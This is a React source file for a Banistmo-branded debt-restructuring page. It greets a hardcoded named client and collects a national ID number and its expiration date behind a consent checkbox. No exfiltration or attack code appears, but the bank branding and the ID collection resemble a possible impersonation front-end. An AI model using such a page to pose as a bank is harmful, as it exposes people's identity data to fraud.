import React, { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import pantalla1 from '../assets/pantalla1.png'   // tu imagen local

export default function IntroVerification() {
  const navigate = useNavigate()
  const [docId, setDocId] = useState('')       // ← nuevo: número de cédula
  const [docDate, setDocDate] = useState('')
  const [accepted, setAccepted] = useState(false)

  // Puede continuar si hay cédula, fecha y aceptó
  const canContinue = Boolean(docId && docDate && accepted)

  // 🔹 Nombre hardcodeado en variable (puedes cambiar este string)
  const NOMBRE_CLIENTE = 'Daniel Fernando Rojas López'
  const primerNombre = NOMBRE_CLIENTE.trim().split(/\s+/)[0] || NOMBRE_CLIENTE

  // (opcional) lo guardamos para pantallas siguientes
  useEffect(() => {
    try { localStorage.setItem('banistmo:clienteNombre', NOMBRE_CLIENTE) } catch {}
  }, [])

  const onSubmit = (e) => {
    e.preventDefault()
    if (canContinue) navigate('/aviso-privacidad')
  }

  return (
    <div className="w-full py-8">
      <div className="mx-auto max-w-6xl px-4 sm:px-6">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          {/* Tarjeta izquierda */}
          <section className="bg-white rounded-2xl shadow p-6 sm:p-8 flex flex-col items-center">
            <div className="w-64 h-48 sm:w-72 sm:h-56 rounded-xl overflow-hidden mb-6 bg-gray-100">
              <img
                src={pantalla1}
                alt="Persona feliz de Reestructura tu deuda"
                className="w-full h-full object-cover"
              />
            </div>

            <h2 className="text-2xl sm:text-3xl font-bold text-gray-900 text-center">
              Reestructura tu deuda
            </h2>
            <p className="text-center text-gray-600 mt-3 max-w-[40ch]">
              Es tu oportunidad para tener la tranquilidad de estar al día con tus pagos
            </p>

            <div className="mt-6 space-y-4 w-full max-w-sm">
              <Feature
                icon={<CalendarIcon className="w-6 h-6" />}
                title="Ajusta tu plan de pagos"
                desc="rápido, sencillo y sin complicaciones."
              />
              <Feature
                icon={<ShieldIcon className="w-6 h-6" />}
                title="Gana control sobre tus finanzas personales"
                desc="con pagos más bajos."
              />
            </div>
          </section>

          {/* Tarjeta derecha */}
          <section className="bg-white rounded-2xl shadow p-6 sm:p-8">
            <form onSubmit={onSubmit} className="max-w-md mx-auto">
              <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 text-center">
                ¡Hola {primerNombre}!
              </h1>
              <p className="text-center text-gray-600 mt-2">
                Bienvenido al portal de Reestructuración de deuda
              </p>

              {/* Bloque: datos de cédula */}
              <div className="mt-8">
                <p className="text-sm text-gray-500 font-medium">
                  Ingresa los datos de tu cédula
                </p>

                {/* Número de cédula */}
                <label className="block mt-3">
                  <div className="border rounded-lg px-3 py-3">
                    <div className="flex items-center gap-3">
                      <IdCardIcon className="w-5 h-5 text-gray-600" />
                      <div className="flex-1">
                        <p className="text-xs text-gray-600 leading-none">
                          Número de cédula
                        </p>
                        <input
                          type="text"
                          inputMode="text"
                          placeholder="Ej. 8-123-456"
                          value={docId}
                          onChange={(e) => setDocId(e.target.value)}
                          className="mt-1 w-full bg-transparent outline-none text-gray-900 placeholder:text-gray-400"
                          aria-label="Número de cédula"
                        />
                      </div>
                    </div>
                  </div>
                  <p className="mt-2 text-xs text-gray-500">Incluye los guiones</p>
                </label>

                {/* Fecha de expiración (debajo de cédula) */}
                

                <label className="block mt-3">
                  <div className="flex items-center gap-3 border rounded-lg px-3 py-3">
                    <CalendarIcon className="w-5 h-5 text-gray-500" />
                    <input
                      type="text"
                      placeholder="Fecha de expiración"
                      value={docDate}
                      onChange={(e) => setDocDate(e.target.value)}
                      className="flex-1 bg-transparent outline-none text-gray-900 placeholder:text-gray-400"
                      aria-label="Fecha de expiración del documento"
                    />
                  </div>
                </label>
              </div>

              {/* Consentimiento */}
              <label className="flex items-start gap-3 mt-6 text-sm leading-5">
                <input
                  type="checkbox"
                  checked={accepted}
                  onChange={(e) => setAccepted(e.target.checked)}
                  className="mt-1 h-4 w-4 rounded border-gray-300 text-yellow-500 focus:ring-yellow-500"
                />
                <span className="text-gray-700">
                  He leído y aceptado el tratamiento de mis datos conforme al{' '}
                  <a href="#" className="font-semibold underline">
                    Aviso de Privacidad de Banistmo, disponible aquí
                  </a>
                </span>
              </label>

              {/* Botón */}
              <div className="mt-8 flex justify-center">
                <button
                  type="submit"
                  disabled={!canContinue}
                  className={[
                    'px-6 py-3 rounded-full font-semibold transition-colors',
                    canContinue
                      ? 'bg-yellow-400 hover:bg-yellow-500 text-gray-900'
                      : 'bg-yellow-200 text-gray-500 cursor-not-allowed',
                  ].join(' ')}
                >
                  Ingresar
                </button>
              </div>
            </form>
          </section>
        </div>
      </div>
    </div>
  )
}

/* --- helpers --- */
function CalendarIcon({ className }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" className={className} aria-hidden="true">
      <rect x="3" y="4.5" width="18" height="16" rx="2.5" stroke="currentColor" />
      <path d="M3 9h18" stroke="currentColor" />
      <path d="M8 3v3M16 3v3" stroke="currentColor" />
    </svg>
  )
}

function ShieldIcon({ className }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" className={className} aria-hidden="true">
      <path d="M12 3l7 3v6c0 5-3.5 7.5-7 9-3.5-1.5-7-4-7-9V6l7-3z" stroke="currentColor" />
      <path d="M9 12l2 2 4-4" stroke="currentColor" />
    </svg>
  )
}

function IdCardIcon({ className }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" className={className} aria-hidden="true">
      <rect x="3" y="5" width="18" height="14" rx="2.5" stroke="currentColor" />
      <circle cx="9" cy="11" r="2" stroke="currentColor" />
      <path d="M6.5 15.5c0-1.38 1.57-2.5 3.5-2.5s3.5 1.12 3.5 2.5" stroke="currentColor" />
      <path d="M14.5 10.5h4M14.5 13h4" stroke="currentColor" />
    </svg>
  )
}

function Feature({ icon, title, desc }) {
  return (
    <div className="flex items-start gap-3">
      <div className="shrink-0 text-gray-700">{icon}</div>
      <div>
        <p className="font-medium text-gray-900">{title}</p>
        <p className="text-gray-600">{desc}</p>
      </div>
    </div>
  )
}
